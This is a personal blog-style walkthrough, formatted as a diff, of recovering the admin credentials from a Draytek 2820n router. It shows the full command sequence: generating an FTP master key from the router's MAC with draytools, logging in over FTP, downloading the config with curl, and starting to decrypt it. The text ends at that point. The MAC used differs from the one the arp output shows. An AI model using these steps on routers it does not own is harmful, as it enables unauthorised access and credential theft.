@@ -1,0 +1,75 @@
+How To; Recover a Username and Password from a Draytek router.
+
+This is a tale of how frighteningly easy it is to recover a username and
+password from a draytek 2820n DSL router using free and opensource tools.
+
+ 
+At work our DSL is provided by a local telecoms company and they also supply the
+DSL modem.
+
+Friday afternoon I rang the telecoms company to get them to open a couple of
+ports and forward them to an IP on the LAN for a project I'm working on. The
+support guy couldn't find any information or record of them supplying the modem
+and therefore it must have been installed by my company (read me). After
+explaining that the modem had stickers with the name of the telecoms company on
+both sides of the thing and I was more than happy to do the configuration myself
+if they could supply the username and password, we settled on doing a factory
+reset on the router and they would send me an email with the radius settings so
+I could set it back up.
+
+The email arrived with the settings I needed and I was all set to push the
+little reset button, but I thought hmmm, how hard would it be to try and hack
+the thing???
+
+20 seconds later and the google had returned the search results for 'recover
+password from dratek router'. There was a whirlpool forum post that looked
+promising. In it was a link to a suite of tools at github. Written in python2
+and released under a GPL3 licence.
+
+A quick read of the README on the github page and I fired up a terminal and
+issued a git clone.
+
+..[ marshall ][ ~ ]
+...git clone https://github.com/ammonium/draytools/ draytools
+
+I then needed the mac of the router I was connected to.
+
+..[ marshall ][ ~ ]
+... arp -a
+? (192.168.1.1) at 00:18:39:aa:46:e7 [ether] on eth0
+
+Using the mac with draytools I could generate the ftp master password
+
+..[ marshall ][ ~ ]
+... python2 draytools.py -m 00:18:39:aa:46:e2
+Username  :    admin
+Master key:    QkWwDrUq
+
+Well, this was going far to well to actually work.
+Or so I thought.
+
+Next was to try and login to the router via ftp.
+
+..[ marshall ][ ~ ]
+...ftp 192.168.1.1
+User (ROUTER_IP:(none)): admin
+331 Enter PASS command
+Password:
+230 Logged in
+ftp> ls
+200 Port command okay
+150 Opening data connection for NLST
+v3320_3.3.4.1_333201.cfg
+v3320_3.3.4.1_333201.all
+
+Oo It worked!
+
+So all I had to do was grab the .cfg file with curl
+
+..[ marshall ][ ~ ]
+...curl ftp://192.168.1.1/v3320_3.3.4.1_333201.cfg -o v3320_3.3.4.1_333201.cfg
+
+and run
+
+..[ marshall ][ ~ ]
+... python2 draytools.py -p v3320_3.3.4.1_333201.cfg
